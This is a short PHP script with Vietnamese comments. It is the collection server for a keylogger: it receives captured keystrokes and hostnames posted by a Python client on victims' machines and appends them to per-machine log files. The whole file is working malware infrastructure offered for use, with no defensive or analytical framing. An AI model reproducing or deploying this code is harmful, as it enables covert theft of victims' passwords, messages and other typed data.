<?php
// fuck.php - Phiên bản lưu file theo tên máy

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = isset($_POST['keys']) ? $_POST['keys'] : '';
    
    // Nhận tên máy tính từ Python gửi lên, nếu không có thì đặt mặc định là 'Unknown'
    $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'Unknown_PC';

    if (!empty($data)) {
        
        // --- BƯỚC QUAN TRỌNG: Lọc tên file ---
        // Chỉ giữ lại chữ cái, số, dấu gạch dưới và gạch ngang để tránh lỗi hệ thống file
        // Ví dụ: Máy tên "Admin's PC" sẽ thành "Admins_PC"
        $safe_hostname = preg_replace('/[^a-zA-Z0-9_-]/', '_', $hostname);
        
        // Đặt tên file theo định dạng: log_TenMayTinh.txt
        $filename = "log_" . $safe_hostname . ".txt";

        // Mở file (hoặc tạo mới) với quyền ghi nối tiếp (append)
        $file = fopen($filename, "a");
        
        // Xử lý encoding UTF-8
        if (function_exists('mb_convert_encoding')) {
             $data = mb_convert_encoding($data, "UTF-8", "auto");
        }
        
        // Ghi dữ liệu
        fwrite($file, $data . "\n"); 
        fclose($file);
        
        echo "Success: Saved to " . $filename;
    } else {
        echo "No data";
    }
}
?>
